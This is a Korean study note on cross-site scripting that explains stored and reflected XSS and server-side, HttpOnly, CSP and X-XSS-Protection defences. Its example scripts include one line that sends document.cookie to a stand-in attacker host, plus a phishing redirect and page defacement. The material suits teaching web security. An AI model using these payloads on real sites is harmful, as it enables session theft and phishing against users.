[cross site scripting]
-서버의 응답에 공격자가 삽입된 악성 스크립트를 받은 사용자의
 웹 브라우저에서 악성 스크립트가 실행되는 취약점을
 Cross Site Scripting(XSS)라고 합니다.

-XSS는 임의의 악성 스크립트를 실행할 수 있으며 이를 통해 해당 웹
 사이트의 사용자 쿠키 또는 세션을 탈취해 사용자의 권한을 얻거나,
 사용자의 페이지를 변조하는 등 서비스를 이용중인 사용자에 대한
 공격을 수행할 수 있습니다.

-XSS 공격의 수행 조건은 이러하다.

1. 입력 데이터에 대한 충분한 검증과정이 없어야한다.
   ->입력한 데이터가 충분한 검증과정이 이루어지지 않아 악성 스크립트가
       삽입될 수 있어야한다.

2. 서버의 응답 데이터가 웹 브라우저 내 페이지에 출력 시 충분한 검증
  과정이 없어야한다.
    ->응답 데이터 출력시 악성 스크립트가 웹 브라우저의 
        렌더링 과정에 성공적으로 포함되어야 한다.

-대표적 예시로 게시판 서비스가 있다. 공격자의 악성 스크립트가 포함된
 게시글이 검증이 이루어지지 않은 채 웹 서버에 업로드 되고 다른 사용자가
 게시글을 조회하는 순간 공격자의 악성 스크립트가 사용자의 웹 브라우저에서 실행되게
 된다.

-XSS는 악성 스크립트의 전달 방식에 따라 Stored XSS, Reflected XSS등으로
 분류된다. 악성 스크립트 전달 방식의 차이가 있을 뿐 사용자의 웹 브라우저에서 
 악성 스크립트를 실행한다는 근본적인 취약점 원인은 동일하다.

-악성 스크립트는 브라우저가 실행할 수 있는 웹 리소스를 말하며, 
 대표적으로 HTML, JS가 있다.

[XSS with JS]

-자바 스크립트는 사용자의 웹 브라우저에서 화면의 동적 출력에 더불어
 사용자와의 상호작용 없이 사용자의 권한으로 정보를 조회하거나 변경하는 등의 요청을
 주고 응답하는 것도 가능하다. 사용자의 권한을 가지고있는 세션 쿠키는 사용자에게
 저장되어있고, 웹 브라우저는 해당 쿠키에 접근할 수 있기 때문이다.

-그 밖에도 JS로 웹 브라우저에서 출력되는 페이지의 내용을 조작하거나 
 웹 브라우저의 위치를 공격자가 원하는 주소로 변경 가능하다.
 그렇기에 JS는 XSS공격시 많이 사용되어진다.

-자바스크립트를 실행하는 대표적 방법은 script태그를 
 이용하는 방식이 있으며, 공격자가 입력 데이터로 script태그를 전송해
 다른 사용자의 응답에 포함되시면 공격자의 자바스크립트가 실행된다.
 script태그 이외에도 태그의 속성중 특정 상황에서 발생하는 on*이벤트를
사용하여 JS실행이 가능하다.
--------------------------------------------------------------------------
간단한 예시:

1. 쿠키및 세션

<script>
// "hello" 문자열 alert 실행.
alert("hello");             //JS의 명령어; "alert("String");" String이라는 문구가 쓰인 alert창을 띄움.
// 현재 페이지의 쿠키(return type: string)
document.cookie; 
// 현재 페이지의 쿠키를 인자로 가진 alert 실행.
alert(document.cookie);
// 쿠키 생성(key: name, value: test)
document.cookie = "name=test;";
// new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
// "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키" 주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
</script>

*C언어 {}마냥 HTML에서는 안에 들어가는 코드의 종류에 따라
 <태그>~(내용)~</태그>의 형태를 띈다. main함수 마냥 <body></body>가
 실제 페이지에 나타나는 내용이며, 위의 <script>태그는 자바 스크립트를 이용한 코드가 
 들어갈때 쓰는 코드이다. (alert)같은 동적 프로그래밍 제외.

**document.cookie :현재 페이지의 쿠키를 조회하여 반환한다(맨 아래 ＠ 보기)
    ->쿠키는 웹 브라우저에도 저장되어 있기에 가능

2.페이지 변조

<script>
// 사용자의 페이지 정보에 접근.  *JS;document는 페이지 자체를 의미한다.
document;              
// 사용자의 페이지에 데이터를 삽입.
document.write("Hacked By DreamHack !");
</script>

*document.write("string")함수: JS; 페이지에 문구를 띄울때 쓰이는 명령어

3. 위치이동(피싱에 주로 이용)

<script>
// 사용자의 위치를 변경.
// 피싱 공격 등으로 사용됨.
location.href = "http://hacker.dreamhack.io/phishing"; 
// 새 창 열기
window.open("http://hacker.dreamhack.io/")
</script>

*location.href: JS; 현재 주솟값 반환
**location.href="이동할 페이지 주소":JS;페이지 이동

----------------------------------------------------------------------------

[stored XSS]

-악성 스크립트가 서버 내에 존재하는 DB또는 파일 등의 형태로 저장되어 있다가
 사용자가 저장된 악성 스크립트를 조회라는 순간 발생하는 형태의 XSS이다.

-대표적으로 게시판에서 게시물을 확인하는 과정에서 스크립트가 포함된
 게시물을 조회할 때 악성 스크리트가 실행되는 공격 방식이 있다.

-게시판과 같이 서버 내에 저장되어 있는 형태에서는 불특정 다수에게 공격이 가능하므로
 파급력이 강력한 공격이 될 수 있다.

-하지만 악성 스크립트가 실행되는 페이지가 사용자가 일반적으로 접근하기
 어려운 서비스일 경우 파급력에서 차이가 생김. 그 외에도 파급력에는
 여러 변수가 관여함.

[Reflected XSS]

-악성 스크립트가 사용자의 요청 시 전송되는 형태이다. 
 사용자의 요청 데이터가 서버의 응답에 포함되는 과정에서 HTML등의
 악성 스크립트가 그대로 출력되어 발생한다.

-이는 Stored XSS와는 다르게 사용자의 요청 데이터에 의해 취약점이
 발생하기 때문에 변조된 데이터가 사용자의 요청으로 전송되는 형태를
 유도해야 한다. 가장 간단한 방법으로는 특정 링크를 유도하는 방식이
 존재하며 Click Jacking, Open Redirect 등의 다른 취약점과 연계해서
 발생시키는 방법도 존재한다.

-대표적 예시로는 게시판 서비스에서 게시물을 조회하는 과정에서 조회하기 위해 
 입력한 데이터에 의해 발생하는 방식으로, 사용자가 게시물 조회를 요청하면
 서버는 해당 요청에 대해 조회한 결과를 응답해 출력하며, 편의성을 위해
 사용자가 조회한 내용을 응답에 포함시키기도 하는 것을 이용한다. 이 때
 악성 스크립트에 대한 방어를 올바르게 하지 못하고 응답에 포함되며, 웹 브라우저에서
 페이지를 출력 시 반영(reflect)되는 결과로 인해 Reflected XSS로 이어질 수 있다.

[Mitigations]

-XSS의 방어 수단이 사용되고 있음

-브라우저 단에서 방어하는 기술 뿐만 아니라 서버 내부에 저장하는
 시점 혹은 저장된 데이터를 꺼내와 출력하는 시점에 입력값을 올바르게
 가공하는 방식으로 XSS를 방어함.

---------------------------------------------------------------------
[방어기술의 종류]

1.Server-side Mitigation

-XSS를 유발할 수 있는 태그삽입을 방지하기 위해 서버 단에서 검증하는 방법

-사용자 인풋은 HTML형태를 지원할 필요가 없으므로, HTML태그가
 입력될 일이 없다면 꺽쇠(<,>), 따옴표 등의 특수문자를 
 HTML Entity Encording 을 이용해 태그로써 인식이 안되도록 수정(Escape)할 수 있다.

-만약 사용자 인풋이 HTML형태를 지원해야 한다면 
 화이트리스트 필터링을 해야한다.

-화이트리스트 필터링은 허용해도 안전한 일부 태그, 속성을 제외한
 모든 값을 필터링 하는것을 의미한다.

-게시글을 운영하는데 있어서 img,video,a태그만 필요하다면
 그 3개의 태그 외의 모든 태그는 필터링 시키는 것이다.

-사용자 인풋을 필터링할때 유의할 점은, 요청의 URI Query 값이나
 POST Body값만 필터링 할 것이 아니라 User-agent,Referer 같은
 헤더도 모두 포함하여 사용자로부터 온 값에 모두 적용해야 한다는 것이다.

-Mozilla에서 제작한 Bleach라는 HTML 필터링 라이브러리를 추천하다고 함
   (https://github.com/mozilla/bleach)

-이 외에도 사용자가 로그인할때 세션에 로그인한 IP주소를 저장하고
 사용자가 페이지를 접속할 때마다 현재 IP주소와 로그인했던 IP주소가 동일한지 여부를 
 확인하는 방법도 있다.

-이는 과거에 깨 널리 쓰였으나 최근에는 모바일 환경 사용자가 많아지며
 접속한 Wifi가 바뀔때마다 사용자의 IP주소가 함께 바뀌는 문제 때문에
 접속한 ip가아닌 접속한 국가가 변경된 경우를 탐지하는 형태로 바뀜.


2.HTTPOnly 플래그 사용

---------------------------------------------------------
Set-Cookie: session=sbdh1vjwvq; HttpOnly
----------------------------------------------------------
-HTTPOnly 플래그는 서버 측에서 응답헤더에 Set-Cookie헤더를 전송해 쿠키를 생성할 때
 옵션으로 설정 가능하며 자바스크립트에서 해당 쿠키에 접근하는 것을 금지한다.
 
-결국 XSS취약점이 발생해도 공격자는 쿠키값을 알아낼 수 없다.


3.Content Security Policy(CSP) 사용

-CSP는 응답 헤더나 meta태그를 통해 아래와 같이 선언해서 사용할 수 있으며,
 각각의 지시어를 적용하여 사이트에서 로드하는 리소스들의 출처를
 제한 할 수 있다.
---------------------------------------------------
Content-Security-Policy: <지시어>; ...
---------------------------------------------------

-예를 들어 default-src 'self' *.dreamhack.io와 같이 설정된 
 CSP는 모든 리소스(이미지 파일, 스크립트 파일 등)의 출처가 현재 
 도메인('self')이거나, *.dreamhack.io도메인이 출처일 경우만 허용한다. 
 또한 script-src를 선언해 자바스크립트 코드의 출처를 제한할 수 
 있으며, 공격자가 외부에 업로드된 자바스크립트 파일을 호출하거나 
 직접 자바스크립트 코드를 작성하는 등의 행동을 막을 수 있습니다. 

※이 외에도 여러가지 지시어가 있음

-신뢰할 출처를 선언하는 방식이니만큼 신뢰받는 CDN 서버가 
 해킹당하면 무력화되는 단점이 있습니다.

*CDN: Contents Delivery Network로써, 물리적으로 먼 거리에 있는 서버와 클라이언트
         사이의 통신은 시간이 오래걸릴 수 있기 때문에, CDN이 클라이언트의 요청에
         직접적으로 응답하고 빠르고 안전한 미디어 전송을 보장함.


4.X-XSS-Protection

-respond 헤더에 아래와 같이 선언해서 사용가능
----------------------------------------------
X-XSS-Protection: <값>
----------------------------------------------

-해당 정책은 웹 브라우저에 내장된 XSS filter를 활성화할 것인지 설정함.
 XSS filter는 웹 브라우저에서 전송된 Request값이 XSS공격 코드와
 유사하게 생겼고, Response에 해당 공격 코드가 포함되었을 때
 XSS 공격이 수행되었다고 판단하여 이를 유저에게 알리고 차단함.
 Request값과 Response를 비교해 판단하는 것으로 보아 알 수 있듯이
 Reflected XSS공격을 막는 데에 적합한 방법이며, 다른 유형의 XSS공격을
 방어할 수는 없다.

--------------------------------------------------------------------------
@ JavaScript;객체 집합

document.anchors
name 속성을 가지는 <a>요소를 모두 반환함.	

document.applets
applet 요소를 모두 반환함. (HTML5에서 제외됨)	

document.body
<body>요소를 반환함.	

document.cookie	
HTML 문서의 쿠키(cookie)를 반환함.	

document.domain	
HTML 문서가 위치한 서버의 도메인 네임(domain name)을 반환함.

document.forms
<form>요소를 모두 반환함.	

document.images
<img>요소를 모두 반환함.	

document.links
href 속성을 가지는 <area>요소와 <a>요소를 모두 반환함.	1

document.referrer
링크(linking)되어 있는 문서의 URI를 반환함.	

document.title	
<title>요소를 반환함.	


document.URL	
HTML 문서의 완전한 URL 주소를 반환함.	

document.baseURI
HTML 문서의 절대 URI(absolute base URI)를 반환함.	

document.doctype
HTML 문서의 문서 타입(doctype)을 반환함.	


document.documentElement
<html>요소를 반환함.	

document.documentMode
웹 브라우저가 사용하고 있는 모드를 반환함.

document.documentURI
HTML 문서의 URI를 반환함.	

document.embeds	
<embed>요소를 모두 반환함.	

document.head
<head>요소를 반환함.	

document.implementation
HTML DOM 구현(implementation)을 반환함.
	
document.inputEncoding
HTML 문서의 문자 인코딩(character set) 형식을 반환함.	

document.lastModified
HTML 문서의 마지막 갱신 날짜 및 시간을 반환함	

document.readyState
HTML 문서의 로딩 상태(loading status)를 반환함.
	
document.scripts	
<script>요소를 모두 반환함.
	
document.strictErrorChecking
오류의 강제 검사 여부를 반환함.	
--------------------------------------------------------------------------






